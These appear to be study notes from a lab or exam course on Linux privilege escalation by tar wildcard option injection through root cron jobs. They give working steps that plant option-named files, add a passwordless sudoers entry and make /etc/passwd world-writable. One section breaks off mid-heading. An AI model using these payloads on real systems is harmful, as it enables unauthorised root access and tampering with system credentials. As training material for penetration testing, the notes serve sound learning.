# Wildcard Abuse — Linux Privilege Escalation (We ahve 2 ways)

## 1. What is Wildcard Abuse?

A **wildcard** is interpreted by the shell before the command executes.

Common wildcards:

| Wildcard | Meaning |
|---|---|
| `*` | Matches any number of characters/files |
| `?` | Matches a single character |
| `[ ]` | Matches one character from the specified set |
| `~` | Expands to a user's home directory |

### Important

The most important wildcard for privilege escalation is:

```bash
*
```

It can expand into **filenames**, which may sometimes be interpreted by a command as **command-line options**.

---

# 2. `tar` Wildcard Abuse

`tar` supports options such as:

```text
--checkpoint
--checkpoint-action=ACTION
```

`--checkpoint-action` can execute an `exec` action when a checkpoint is reached.

Check:

```bash
man tar
```

Relevant options:

```text
--checkpoint[=N]
--checkpoint-action=ACTION
```

---

# 3. Vulnerable Cron Job

HTB example:

```cron
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

### Breakdown

```text
*/01
→ Runs every minute

cd /home/htb-student
→ Changes to the target directory

tar -zcf /home/htb-student/backup.tar.gz *
→ Creates a compressed backup of the files
```

The important part is:

```bash
tar -zcf /home/htb-student/backup.tar.gz *
```

The `*` expands to filenames.

---

# 4. Exploitation

Create a script:

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

Create a filename that becomes a `tar` option:

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
```

Create the checkpoint option:

```bash
echo "" > --checkpoint=1
```

Check the files:

```bash
ls -la
```

Expected files include:

```text
--checkpoint=1
--checkpoint-action=exec=sh root.sh
root.sh
```

---

# 5. How the Attack Works

The cron job runs:

```bash
tar -zcf /home/htb-student/backup.tar.gz *
```

The shell expands `*`:

```text
*
↓
--checkpoint=1
--checkpoint-action=exec=sh root.sh
...
```

So `tar` effectively receives:

```bash
tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh
```

`tar` interprets the filenames as **options**.

Therefore:

```text
--checkpoint=1
        ↓
Enable checkpoint

--checkpoint-action=exec=sh root.sh
        ↓
Execute root.sh
```

If the cron job runs with elevated privileges, `root.sh` executes with those privileges.

---

# 6. Verify Privilege Escalation

After the cron job runs:

```bash
sudo -l
```

Expected:

```text
User htb-student may run the following commands:
    (root) NOPASSWD: ALL
```

Then:

```bash
sudo -i
```

When you get a shell:


# 2nd way = Wildcard Expansion Exploit

## 1. Overview

- Misuse of wildcards in commands such as `tar` can be exploited through **option injection**.
- An attacker can create filenames that are interpreted as command-line options when the wildcard expands.
- If the vulnerable command runs with elevated privileges, this can result in **privilege escalation**.

---

## 2. Vulnerable Cron Job

Edit the cron configuration:

```bash
vim /etc/crontab
```

Example:

```cron
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12)
# |  |  |  |  .---- day of week (0 - 6)
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

* * * * * root tar -czf /tmp/backup.tar.gz /home/armour/*
```

### Important

The vulnerable part is:

```bash
tar -czf /tmp/backup.tar.gz /home/armour/*
```

The `*` expands to filenames inside `/home/armour/`.

---

## 3. Exploitation

Create the payload script:

```bash
echo 'chmod 777 /etc/passwd' > backup.sh
```

Make it executable:

```bash
chmod +x backup.sh
```

Create a malicious filename that becomes a `tar` option:

```bash
echo "" > "--checkpoint-action=exec=sh backup.sh"
```

Or specify the full path:

```bash
echo "" > "--checkpoint-action=exec=sh /home/armour/backup.sh"
```

Create the checkpoint option:

```bash
echo "" > --checkpoint=1
```

---

## 4. How It Works

When cron runs:

```bash
tar -czf /tmp/backup.tar.gz /home/armour/*
```

the wildcard expands to the filenames created by the attacker.

The malicious filenames are then interpreted by `tar` as command-line options:

```text
/home/armour/*
        ↓
--checkpoint=1
--checkpoint-action=exec=sh backup.sh
        ↓
tar interprets them as options
        ↓
backup.sh executes
```

If the cron job runs as `root`, the payload executes with **root privileges**.

---

## 5. Key Conditions

```text
Privileged cron job
        +
Wildcard (`*`)
        +
Attacker-controlled filenames
        +
Command accepts option-like arguments
        =
Potential wildcard privilege escalation
```

> **Exam Tip:** Look for privileged scheduled commands that use wildcards, especially commands such as `tar` that support options capable of executing commands.
